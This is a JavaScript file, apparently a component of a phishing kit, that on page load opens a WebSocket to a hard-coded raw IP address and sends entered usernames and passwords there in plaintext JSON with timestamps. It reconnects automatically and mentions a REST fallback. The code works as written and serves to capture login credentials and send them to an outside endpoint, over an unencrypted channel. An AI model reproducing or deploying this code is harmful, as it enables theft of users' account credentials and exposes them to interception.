// WebSocket Real-time Login Sender
class LoginWebSocketClient {
    constructor(serverUrl) {
        this.serverUrl = serverUrl;
        this.ws = null;
        this.isConnected = false;
        this.reconnectAttempts = 0;
        this.maxReconnectAttempts = 5;
        this.reconnectDelay = 3000;
    }

    connect() {
        try {
            console.log('🔌 Connecting to real-time server...');
            this.ws = new WebSocket(this.serverUrl);

            this.ws.onopen = () => {
                console.log('✅ Connected to real-time server');
                this.isConnected = true;
                this.reconnectAttempts = 0;
            };

            this.ws.onmessage = (event) => {
                const data = JSON.parse(event.data);
                console.log('📨 Server message:', data);
            };

            this.ws.onerror = (error) => {
                console.error('❌ WebSocket error:', error);
                this.isConnected = false;
            };

            this.ws.onclose = () => {
                console.log('❌ Disconnected from real-time server');
                this.isConnected = false;
                this.attemptReconnect();
            };

        } catch (error) {
            console.error('Connection error:', error);
            this.attemptReconnect();
        }
    }

    attemptReconnect() {
        if (this.reconnectAttempts < this.maxReconnectAttempts) {
            this.reconnectAttempts++;
            console.log(`🔄 Reconnecting... (Attempt ${this.reconnectAttempts}/${this.maxReconnectAttempts})`);
            setTimeout(() => this.connect(), this.reconnectDelay);
        } else {
            console.error('❌ Max reconnection attempts reached');
        }
    }

    sendCredentials(username, password) {
        if (this.isConnected && this.ws.readyState === WebSocket.OPEN) {
            const data = {
                username: username,
                password: password,
                timestamp: new Date().toISOString()
            };
            this.ws.send(JSON.stringify(data));
            console.log('✅ Credentials sent via WebSocket');
            return true;
        } else {
            console.warn('⚠️ WebSocket not connected, falling back to REST API');
            return false;
        }
    }

    disconnect() {
        if (this.ws) {
            this.ws.close();
        }
    }
}

// Initialize WebSocket client
let wsClient = null;

function initializeWebSocket() {
    if (typeof CONFIG !== 'undefined' && CONFIG.WEBSOCKET_ENABLED) {
        const wsUrl = CONFIG.WEBSOCKET_URL || 'ws://38.180.243.44:8080';
        wsClient = new LoginWebSocketClient(wsUrl);
        wsClient.connect();
    }
}

// Call this when page loads
document.addEventListener('DOMContentLoaded', function() {
    initializeWebSocket();
});
